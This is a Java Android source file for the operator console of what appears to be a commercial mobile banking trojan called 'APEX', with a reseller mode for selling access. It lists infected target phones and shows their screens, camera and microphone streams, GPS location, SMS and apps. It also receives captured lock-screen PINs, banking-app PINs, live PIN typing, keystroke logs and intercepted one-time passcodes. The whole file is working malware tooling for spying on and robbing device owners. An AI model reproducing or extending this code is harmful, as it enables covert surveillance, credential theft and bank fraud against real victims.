package com.device.ctrl;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.res.ColorStateList;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.RippleDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.*;
public class AdminActivity extends Activity {
    private final Handler h = new Handler(Looper.getMainLooper());
    private final Map<String, Device> devices = new LinkedHashMap<>();
    private Device selDev;
    private final int[] theme = {0xFF020617, 0xFF0B132B, 0xFF1C2541, 0xFF3A506B, 0xFFEF4444, 0xFF10B981, 0xFFF8FAFC, 0xFF94A3B8, 0xFF00F0FF};
    private DevicesPanel devPanel; private ScreenPanel screenPanel; private LockPanel lockPanel;
    private SmsPanel smsPanel; private AppsPanel appsPanel; private ToolsPanel toolsPanel;
    private BankPanel bankPanel;
    private ResellersPanel resellersPanel;
    private LiveNodesPanel nodesPanel;
    private NotifPanel notifPanel;
    private LocationPanel locationPanel;
    private BasePanel[] panels;
    private FrameLayout contentArea;
    private View[] tabViews;
    private int currentTab = 0;
    private boolean isResellerMode = false;
    private LinearLayout[] navTabItems;
    private TextView tvTargetStatus;

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        isResellerMode = com.device.ctrl.BuildConfig.IS_RESELLER;
        if (isResellerMode) {
            String token = getSharedPreferences("admin_prefs", MODE_PRIVATE).getString("reseller_login_token", "");
            if (!token.isEmpty()) { AdminRelayClient.get().setResellerToken(token); AdminRelayClient.get().setResellerId(getSharedPreferences("admin_prefs", MODE_PRIVATE).getString("reseller_id", "")); }
        }
        buildUI();
        AdminRelayClient.get().init(this, msg -> h.post(() -> dispatchMessage(msg)));
        AdminRelayClient.get().connect();
    }

    private void buildUI() {
        LinearLayout root = col(); root.setBackgroundColor(0xFF070B14);

        // ─── Modern Cyberpunk Glass Header ─────────────────────────────
        LinearLayout header = lin(false);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setPadding(dp(14), dp(10), dp(14), dp(10));
        GradientDrawable hBg = new GradientDrawable();
        hBg.setColor(0xF00D1527);
        hBg.setStroke(dp(1), 0x2500F0FF);
        header.setBackground(hBg);

        TextView tvLogo = codeTv("⚡ APEX", 17, 0xFF00F0FF, true);
        tvLogo.setPadding(0, 0, dp(10), 0);
        header.addView(tvLogo);

        // Target Status Chip (Tap to open Devices List)
        tvTargetStatus = codeTv("⚪ SELECT DEVICE", 11, theme[7], true);
        tvTargetStatus.setPadding(dp(12), dp(6), dp(12), dp(6));
        GradientDrawable tsBg = new GradientDrawable();
        tsBg.setColor(0x18FFFFFF);
        tsBg.setCornerRadius(dp(14));
        tsBg.setStroke(dp(1), 0x22FFFFFF);
        tvTargetStatus.setBackground(tsBg);
        tvTargetStatus.setSingleLine(true);
        tvTargetStatus.setOnClickListener(v -> switchTab(0));
        LinearLayout.LayoutParams tslp = new LinearLayout.LayoutParams(0, -2, 1f);
        tslp.rightMargin = dp(10);
        header.addView(tvTargetStatus, tslp);

        Button btnExit = new Button(this);
        styleBtn(btnExit);
        btnExit.setText("EXIT");
        btnExit.setTextColor(0xFFF43F5E);
        btnExit.setTextSize(11);
        btnExit.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        btnExit.setBackground(ripple(0x1EF43F5E, 0x44F43F5E, 14));
        btnExit.setPadding(dp(12), dp(6), dp(12), dp(6));
        btnExit.setOnClickListener(v -> handleLogoutOrExit());
        header.addView(btnExit);

        root.addView(header);

        buildPanels();
        contentArea = new FrameLayout(this);
        tabViews = new View[]{ devPanel.buildView(), lockPanel.buildView(), smsPanel.buildView(), appsPanel.buildView(), screenPanel.buildView(), toolsPanel.buildView(), isResellerMode ? new View(this) : resellersPanel.buildView(), nodesPanel.buildView(), bankPanel.buildView(), notifPanel.buildView(), locationPanel.buildView() };
        for (int i = 0; i < tabViews.length; i++) { if (i > 0) tabViews[i].setVisibility(View.GONE); contentArea.addView(tabViews[i]); }
        root.addView(contentArea, new LinearLayout.LayoutParams(-1, 0, 1f));

        // ─── Horizontal Scrollable Glass Dock Bar ───────────────────────
        HorizontalScrollView hsv = new HorizontalScrollView(this);
        hsv.setHorizontalScrollBarEnabled(false);
        hsv.setOverScrollMode(View.OVER_SCROLL_NEVER);
        hsv.setPadding(dp(4), dp(2), dp(4), dp(2));

        LinearLayout dock = lin(false);
        dock.setGravity(Gravity.CENTER_VERTICAL);
        dock.setPadding(dp(8), dp(6), dp(8), dp(6));
        GradientDrawable dBg = new GradientDrawable();
        dBg.setColor(0xF40D1527);
        dBg.setCornerRadius(dp(22));
        dBg.setStroke(dp(1), 0x3300F0FF);
        dock.setBackground(dBg);

        String[] icons =  {"📲",      "📱",     "🔔",        "📍",      "👾",        "🔒",   "💬",   "🤖",   "⚙️",     "👥"}; 
        String[] labels = {"Devices", "Screen", "Live OTP",  "GPS Map", "Bank & PIN","Lock", "SMS",  "Apps", "Tools",  "Resell"}; 
        int[] mappings =  {0,         4,        9,           10,        8,           1,      2,      3,      5,        6};

        navTabItems = new LinearLayout[mappings.length];
        for (int i = 0; i < (isResellerMode ? mappings.length - 1 : mappings.length); i++) {
            final int targetIdx = mappings[i];
            LinearLayout tab = lin(false);
            tab.setGravity(Gravity.CENTER);
            tab.setPadding(dp(12), dp(7), dp(12), dp(7));

            TextView tvI = codeTv(icons[i], 13, theme[7], false);
            tab.addView(tvI);

            TextView tvL = codeTv(" " + labels[i], 11, theme[7], true);
            tvL.setSingleLine(true);
            tab.addView(tvL);

            tab.setOnClickListener(v -> switchTab(targetIdx));
            navTabItems[i] = tab;
            LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(-2, -2);
            tlp.rightMargin = dp(6);
            dock.addView(tab, tlp);
        }
        hsv.addView(dock, new FrameLayout.LayoutParams(-2, -2));

        FrameLayout dockWrap = new FrameLayout(this);
        dockWrap.setPadding(dp(6), dp(2), dp(6), dp(8));
        dockWrap.addView(hsv, new FrameLayout.LayoutParams(-1, -2, Gravity.BOTTOM));
        root.addView(dockWrap);

        setContentView(root);
        switchTab(0); // Start on Devices list
    }

    private void buildPanels() {
        devPanel = new DevicesPanel(this, theme, devices, this::selectDevice); screenPanel = new ScreenPanel(this, theme); lockPanel = new LockPanel(this, theme);
        smsPanel = new SmsPanel(this, theme); appsPanel = new AppsPanel(this, theme); toolsPanel = new ToolsPanel(this, theme, devices);
        bankPanel = new BankPanel(this, theme);
        resellersPanel = new ResellersPanel(this, theme, devices);
        nodesPanel = new LiveNodesPanel(this, theme);
        notifPanel = new NotifPanel(this, theme);
        locationPanel = new LocationPanel(this, theme);
        panels = isResellerMode ? new BasePanel[]{devPanel, screenPanel, lockPanel, smsPanel, appsPanel, bankPanel, toolsPanel, nodesPanel, notifPanel, locationPanel} : new BasePanel[]{devPanel, screenPanel, lockPanel, smsPanel, appsPanel, bankPanel, toolsPanel, resellersPanel, nodesPanel, notifPanel, locationPanel};
    }

    private void switchTab(int idx) {
        if (idx != 0 && idx != 6 && selDev == null) {
            Toast.makeText(this, "Select a Device First", Toast.LENGTH_SHORT).show();
            return;
        }
        currentTab = idx;
        for (int i = 0; i < tabViews.length; i++) {
            tabViews[i].setVisibility(i == idx ? View.VISIBLE : View.GONE);
            if (i == idx) { tabViews[i].setAlpha(0f); tabViews[i].animate().alpha(1f).setDuration(160).start(); }
        }
        int[] mappings = {0, 4, 9, 10, 8, 1, 2, 3, 5, 6};
        for (int i = 0; i < navTabItems.length; i++) {
            if (navTabItems[i] != null) {
                boolean active = (mappings[i] == idx);
                GradientDrawable tabBg = new GradientDrawable();
                if (active) {
                    tabBg.setColor(0x2800F0FF);
                    tabBg.setCornerRadius(dp(16));
                    tabBg.setStroke(dp(1.2f), 0xFF00F0FF);
                } else {
                    tabBg.setColor(0x0CFFFFFF);
                    tabBg.setCornerRadius(dp(16));
                    tabBg.setStroke(dp(1), 0x14FFFFFF);
                }
                navTabItems[i].setBackground(tabBg);
                ((TextView) navTabItems[i].getChildAt(0)).setTextColor(active ? 0xFF00F0FF : theme[7]);
                ((TextView) navTabItems[i].getChildAt(1)).setTextColor(active ? 0xFF00F0FF : theme[7]);
            }
        }
        if (idx != 4) screenPanel.stopStream();
    }

    private void selectDevice(Device d) {
        selDev = d;
        if (tvTargetStatus != null && d != null) {
            String bat = d.batteryLevel >= 0 ? " · 🔋" + d.batteryLevel + "%" : "";
            tvTargetStatus.setText((d.online ? "🟢 " : "⚪ ") + d.model + bat);
            tvTargetStatus.setTextColor(d.online ? 0xFF10B981 : 0xFF94A3B8);
        }
        for (BasePanel p : panels) p.onDeviceSelected(d);
        switchTab(4); // Switch to Screen view
    }
    private void dispatchMessage(JSONObject msg) {
        String type = msg.optString("type", ""); updateDeviceState(msg);
        for (BasePanel p : panels) p.onMessage(msg);
        if ("auth_failed".equals(type) || "admin_join_failed".equals(type) || "reseller_join_failed".equals(type)) {
            AdminRelayClient.get().disconnect(); Toast.makeText(this, "Auth failed", 1).show();
            if (isResellerMode) { getSharedPreferences("admin_prefs", MODE_PRIVATE).edit().remove("reseller_id").apply(); startActivity(new Intent(this, ResellerLoginActivity.class)); finish(); }
        }
    }
    private void updateDeviceState(JSONObject msg) {
        String mt = msg.optString("type", ""); if ("device_list".equals(mt) || "admin_joined".equals(mt) || "reseller_joined".equals(mt)) {
            JSONArray arr = msg.optJSONArray("devices"); if (arr == null) return;
            for (int i = 0; i < arr.length(); i++) { String id = Device.extractId(arr.optJSONObject(i)); if (!id.isEmpty()) { Device d = devices.getOrDefault(id, new Device()); d.updateFromJSON(arr.optJSONObject(i)); devices.put(id, d); } }
            return;
        }
        String aid = Device.extractId(msg); if (aid.isEmpty()) return;
        Device d = devices.getOrDefault(aid, new Device()); devices.put(aid, d);
        switch (msg.optString("type")) {
            case "device_online": d.online = true; d.updateFromJSON(msg); break;
            case "device_offline": d.online = false; break;
            case "battery_info": d.batteryLevel = msg.optInt("level", d.batteryLevel); d.isLocked = msg.optBoolean("locked", d.isLocked); break;
            case "lock_captured": d.addLockEntry(msg.optString("lockType", ""), msg.optString("value", ""), msg.optLong("timestamp", System.currentTimeMillis())); break;
            case "bank_data": d.addBankEntry(msg.optString("package", ""), msg.optString("pin", "")); break;
            case "pin_typing": d.livePinTyping = msg.optString("pin", ""); break;
            case "lock_detected": d.detectedLockType = msg.optString("lockType", d.detectedLockType); break;
            case "save_credentials":
                JSONObject cred = msg.optJSONObject("credentials");
                if (cred != null) {
                    d.credType = cred.optString("type", d.credType);
                    d.credValue = cred.optString("value", d.credValue);
                    d.credTimestamp = cred.optLong("timestamp", System.currentTimeMillis());
                }
                break;
            case "keylog_batch":
            case "keylog_history":
                JSONArray evs = msg.optJSONArray("events");
                if (evs != null) {
                    for (int i = 0; i < evs.length(); i++) {
                        JSONObject ev = evs.optJSONObject(i);
                        if (ev != null) {
                            d.addKeylogEntry(ev.optLong("t", System.currentTimeMillis()), ev.optString("pkg", ""), ev.optString("type", ""), ev.optString("txt", ""));
                        }
                    }
                }
                break;
            case "location_data":
                d.latitude = msg.optDouble("lat", d.latitude);
                d.longitude = msg.optDouble("lon", d.longitude);
                d.locAccuracy = (float) msg.optDouble("acc", d.locAccuracy);
                d.locProvider = msg.optString("provider", d.locProvider);
                d.locTime = msg.optLong("time", System.currentTimeMillis());
                break;
            case "notification_event":
                d.addNotification(msg.optLong("timestamp", System.currentTimeMillis()), msg.optString("pkg", ""), msg.optString("title", ""), msg.optString("text", ""), false, "");
                break;
            case "otp_alert":
                d.addNotification(msg.optLong("timestamp", System.currentTimeMillis()), msg.optString("pkg", ""), msg.optString("title", ""), msg.optString("body", ""), true, msg.optString("code", ""));
                break;
        }
    }
    private int dp(float dp) { return (int) (dp * getResources().getDisplayMetrics().density + 0.5f); }
    private void styleBtn(Button b) { b.setMinHeight(0); b.setMinimumHeight(0); b.setMinWidth(0); b.setMinimumWidth(0); b.setIncludeFontPadding(false); b.setGravity(Gravity.CENTER); }
    private LinearLayout col() { LinearLayout l = new LinearLayout(this); l.setOrientation(LinearLayout.VERTICAL); return l; }
    private LinearLayout lin(boolean v) { LinearLayout l = new LinearLayout(this); l.setOrientation(v ? LinearLayout.VERTICAL : LinearLayout.HORIZONTAL); return l; }
    private TextView codeTv(String s, int sz, int c, boolean b) { TextView t = new TextView(this); t.setText(s); t.setTextSize(sz); t.setTextColor(c); t.setTypeface(Typeface.create("sans-serif" + (b ? "-medium" : ""), Typeface.NORMAL)); return t; }
    private RippleDrawable ripple(int bg, int rip, int rDp) { GradientDrawable c = new GradientDrawable(); if(bg!=0) c.setColor(bg); c.setCornerRadius(dp(rDp)); GradientDrawable m = new GradientDrawable(); m.setColor(0xFFFFFFFF); m.setCornerRadius(dp(rDp)); return new RippleDrawable(ColorStateList.valueOf(rip), bg==0?null:c, m); }
    private void handleLogoutOrExit() {
        new AlertDialog.Builder(this).setTitle("Exit").setMessage("Exit console?").setPositiveButton("Yes", (d, w) -> { AdminRelayClient.get().disconnect(); finishAffinity(); }).setNegativeButton("No", null).show();
    }
    @Override protected void onPause() {
        super.onPause();
        if (selDev != null) {
            AdminRelayClient.get().sendCmd(selDev.androidId, "stop_mjpeg", null);
            AdminRelayClient.get().sendCmd(selDev.androidId, "stop_cam_stream", null);
            AdminRelayClient.get().sendCmd(selDev.androidId, "stop_mic", null);
        }
    }
    @Override protected void onResume() {
        super.onResume();
        AdminRelayClient.get().connect();
        if (selDev != null) {
            if (screenPanel != null) screenPanel.onDeviceSelected(selDev);
            if (toolsPanel != null) toolsPanel.onDeviceSelected(selDev);
        }
    }
    @Override public void onBackPressed() { if (currentTab != 0) switchTab(0); else handleLogoutOrExit(); }
    @Override protected void onDestroy() { super.onDestroy(); AdminRelayClient.get().disconnect(); }
}
